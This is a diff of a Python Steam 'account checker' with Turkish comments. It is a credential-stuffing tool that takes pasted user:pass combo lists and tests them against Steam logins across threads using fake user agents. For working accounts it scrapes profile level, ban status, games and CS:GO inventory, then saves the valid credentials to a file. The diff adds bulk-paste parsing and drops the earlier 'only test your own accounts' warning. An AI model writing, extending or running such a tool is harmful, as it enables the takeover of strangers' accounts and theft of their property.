@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# KSIB STEAM ACCOUNT CHECKER - Toplu Giriş | Detaylı Rapor
+# KSIB STEAM ACCOUNT CHECKER - Toplu Yapıştırma | Detaylı Rapor
 import requests, threading, random, time, sys, os, json, re
 from fake_useragent import UserAgent
 from colorama import init, Fore, Style
@@ -48,6 +48,40 @@ class SteamChecker:
             "Accept-Language": "tr-TR,tr;q=0.9",
         }
     
+    def parse_combo_text(self, text):
+        """Toplu yapıştırılan metni parse et"""
+        self.combo_list = []
+        lines = text.strip().split('\n')
+        
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
+            
+            # Farklı formatları destekle
+            # user:pass
+            # user:pass:extra
+            # user:pass word
+            if ':' in line:
+                parts = line.split(':')
+                user = parts[0].strip()
+                pwd = ':'.join(parts[1:]).strip()
+            elif ' ' in line:
+                parts = line.split()
+                user = parts[0].strip()
+                pwd = parts[1].strip() if len(parts) > 1 else ""
+            elif ';' in line:
+                parts = line.split(';')
+                user = parts[0].strip()
+                pwd = parts[1].strip() if len(parts) > 1 else ""
+            else:
+                continue
+            
+            if user and pwd and len(user) > 2 and len(pwd) > 2:
+                self.combo_list.append({"user": user, "pass": pwd})
+        
+        return len(self.combo_list)
+    
     def check_login(self, user, pwd):
         """Steam giriş kontrolü"""
         try:
@@ -87,40 +121,33 @@ class SteamChecker:
             "vac_banned": "?",
             "games_count": "?",
             "playtime_hours": "?",
-            "wallet": "?",
             "inventory_value": "?",
             "top_games": []
         }
         
         try:
-            # Steam ID
             r = session.get("https://steamcommunity.com/my/", timeout=10)
             id_match = re.search(r'g_steamID = "(\d+)"', r.text)
             if id_match:
                 steam_id = id_match.group(1)
                 info["steam_id"] = steam_id
                 
-                # Profil sayfası
                 profile_url = f"https://steamcommunity.com/profiles/{steam_id}"
                 r2 = session.get(profile_url, timeout=10)
                 
-                # Level
                 level_match = re.search(r'persona_level.*?>(\d+)<', r2.text)
                 if level_match:
                     info["level"] = level_match.group(1)
                 
-                # Üyelik tarihi
                 member_match = re.search(r'memberSince">(.*?)<', r2.text)
                 if member_match:
                     info["member_since"] = member_match.group(1).strip()
                 
-                # VAC
                 if "VAC" in r2.text.upper() or "ban" in r2.text.lower():
                     info["vac_banned"] = "⚠️ Banlı"
                 else:
                     info["vac_banned"] = "✅ Temiz"
                 
-                # Oyunlar
                 games_url = f"https://steamcommunity.com/profiles/{steam_id}/games/?tab=all"
                 r3 = session.get(games_url, timeout=10)
                 
@@ -134,16 +161,12 @@ class SteamChecker:
                     games.sort(key=lambda x: x["hours"], reverse=True)
                     info["top_games"] = games[:5]
                 
-                # Envanter
                 inv_url = f"https://steamcommunity.com/inventory/{steam_id}/730/2?count=10"
                 r4 = session.get(inv_url, timeout=10)
                 if r4.status_code == 200:
                     inv_data = r4.json()
                     total_items = len(inv_data.get("assets", []))
-                    if total_items > 0:
-                        info["inventory_value"] = f"{total_items} item (CS:GO)"
-                    else:
-                        info["inventory_value"] = "Boş"
+                    info["inventory_value"] = f"{total_items} item (CS:GO)" if total_items > 0 else "Boş"
         
         except:
             pass
@@ -164,12 +187,10 @@ class SteamChecker:
             user = combo["user"]
             pwd = combo["pass"]
             
-            # Giriş kontrolü
             success, session = self.check_login(user, pwd)
             
             with self.lock:
                 if success == True:
-                    # Detayları çek
                     info = self.get_profile_info(session, user)
                     
                     self.working.append({
@@ -193,11 +214,10 @@ class SteamChecker:
                     print(Fore.YELLOW + f"  🔒 [{current}/{len(self.combo_list)}] {user} - 2FA Korumalı")
                 else:
                     self.dead.append({"user": user, "pass": pwd, "reason": "Yanlış"})
-                    if current % 3 == 0:
+                    if current % 5 == 0:
                         print(Fore.RED + f"  ❌ [{current}/{len(self.combo_list)}] Kontrol ediliyor... ({len(self.working)} çalışan)")
                 
-                # İlerleme
-                if current % 5 == 0 or current == len(self.combo_list):
+                if current % 10 == 0 or current == len(self.combo_list):
                     elapsed = time.time() - self.start_time
                     rate = current / elapsed if elapsed > 0 else 0
                     eta = (len(self.combo_list) - current) / rate if rate > 0 else 0
@@ -268,16 +288,10 @@ class SteamChecker:
                     for game in info['top_games']:
                         print(Fore.CYAN + f"     • {game['name'][:35]}: {game['hours']} saat")
             
-            # Kaydet
             with open("steam_calisan.txt", "w") as f:
                 for acc in self.working:
                     f.write(f"{acc['user']}:{acc['pass']}\n")
             print(Fore.GREEN + f"\n💾 steam_calisan.txt olarak kaydedildi!")
-        
-        if self.dead:
-            print(Fore.RED + f"\n❌ BAŞARISIZ ({len(self.dead)}):")
-            for d in self.dead[:10]:
-                print(Fore.RED + f"  • {d['user']} - {d.get('reason', 'Yanlış')}")
         
         print(Fore.YELLOW + "\n" + "="*60 + "\n")
 
@@ -288,72 +302,72 @@ def ana():
     
     while True:
         print(Fore.YELLOW + "\n🎮 STEAM CHECKER ANA MENÜ:")
-        print("1. ✍️  Yeni Combo Listesi Gir")
-        print("2. 📋 Mevcut Listeyi Görüntüle ({0} hesap)".format(len(checker.combo_list)))
-        print("3. 🚀 Kontrolü Başlat")
-        print("4. 🚪 Çıkış")
+        print(f"1. ✍️  Combo Listesi Gir (Şu an {len(checker.combo_list)} hesap var)")
+        print("2. 🚀 Kontrolü Başlat")
+        print("3. 🚪 Çıkış")
         
         sec = input(Fore.GREEN + "\nSeçim: ").strip()
         
         if sec == "1":
-            print(Fore.YELLOW + "\n✍️  COMBO LİSTESİ GİRİN:")
-            print(Fore.CYAN + "Her satıra bir hesap: kullanici:sifre")
+            print(Fore.YELLOW + "\n✍️  COMBO LİSTESİNİ YAPIŞTIR:")
+            print(Fore.CYAN + "Tüm listeyi tek seferde yapıştırın (user:pass formatında)")
             print(Fore.CYAN + "Bitince boş satırda Enter'a basın.\n")
+            
+            print(Fore.WHITE + "┌─ Combo Listesi ───────────────┐")
             
             lines = []
             while True:
-                line = input(Fore.GREEN + f"{len(lines)+1}> ").strip()
+                line = input(Fore.WHITE + "│ " + Fore.GREEN).strip()
                 if not line:
                     break
-                if ':' in line and len(line) > 5:
-                    lines.append(line)
-                    print(Fore.GREEN + f"   ✅ Eklendi: {line.split(':')[0]}")
-                else:
-                    print(Fore.RED + "   ❌ Format: kullanici:sifre")
+                lines.append(line)
+            
+            print(Fore.WHITE + "└──────────────────────────────┘")
             
             if lines:
-                checker.combo_list = []
-                for line in lines:
-                    parts = line.split(':')
-                    checker.combo_list.append({
-                        "user": parts[0].strip(),
-                        "pass": ':'.join(parts[1:]).strip()
-                    })
-                print(Fore.GREEN + f"\n✅ {len(checker.combo_list)} hesap eklendi!")
+                full_text = '\n'.join(lines)
+                count = checker.parse_combo_text(full_text)
+                
+                if count > 0:
+                    print(Fore.GREEN + f"\n✅ {count} hesap başarıyla eklendi!")
+                    
+                    # Önizleme
+                    print(Fore.CYAN + "\n📋 Eklenen hesaplar (ilk 5):")
+                    for i, c in enumerate(checker.combo_list[:5], 1):
+                        print(Fore.WHITE + f"  [{i}] {c['user']}:{c['pass'][:15]}...")
+                    
+                    if count > 5:
+                        print(Fore.WHITE + f"  ... ve {count-5} tane daha!")
+                else:
+                    print(Fore.RED + "\n❌ Geçerli format bulunamadı! (user:pass şeklinde olmalı)")
             else:
-                print(Fore.YELLOW + "⚠️ Hiç hesap eklenmedi!")
+                print(Fore.YELLOW + "⚠️ Hiçbir şey yapıştırılmadı!")
             
             input(Fore.YELLOW + "\nDevam için Enter...")
             checker.bnr()
         
         elif sec == "2":
-            checker.bnr()
-            if checker.combo_list:
-                print(Fore.YELLOW + f"\n📋 MEVCUT LİSTE ({len(checker.combo_list)} hesap):\n")
-                for i, c in enumerate(checker.combo_list, 1):
-                    print(Fore.WHITE + f"  [{i}] {c['user']}:{c['pass'][:15]}...")
-            else:
-                print(Fore.RED + "\n❌ Liste boş! Önce combo girin.")
-            input(Fore.YELLOW + "\nDevam için Enter...")
-            checker.bnr()
-        
-        elif sec == "3":
             if not checker.combo_list:
                 print(Fore.RED + "\n❌ Önce combo listesi girin!")
                 input(Fore.YELLOW + "Devam için Enter...")
                 checker.bnr()
                 continue
             
-            threads = int(input(Fore.GREEN + "\n🧵 Thread sayısı (3): ") or "3")
-            print(Fore.RED + "\n⚠️ Sadece kendi hesaplarınızı test edin!")
+            print(Fore.CYAN + f"\n📋 {len(checker.combo_list)} hesap kontrol edilecek:")
+            for i, c in enumerate(checker.combo_list[:5], 1):
+                print(Fore.WHITE + f"  [{i}] {c['user']}")
+            if len(checker.combo_list) > 5:
+                print(Fore.WHITE + f"  ... ve {len(checker.combo_list)-5} tane daha!")
+            
+            threads = int(input(Fore.GREEN + "\n🧵 Thread (3): ") or "3")
             
             if input(Fore.GREEN + "🚀 Başlat? (E/H): ").upper() == 'E':
                 checker.start_checking(threads)
-                checker.combo_list = []  # Bitince listeyi temizle
+                checker.combo_list = []
                 input(Fore.YELLOW + "\nAna menü için Enter...")
                 checker.bnr()
         
-        elif sec == "4":
+        elif sec == "3":
             print(Fore.GREEN + "\n👋 Görüşürüz!")
             break
 
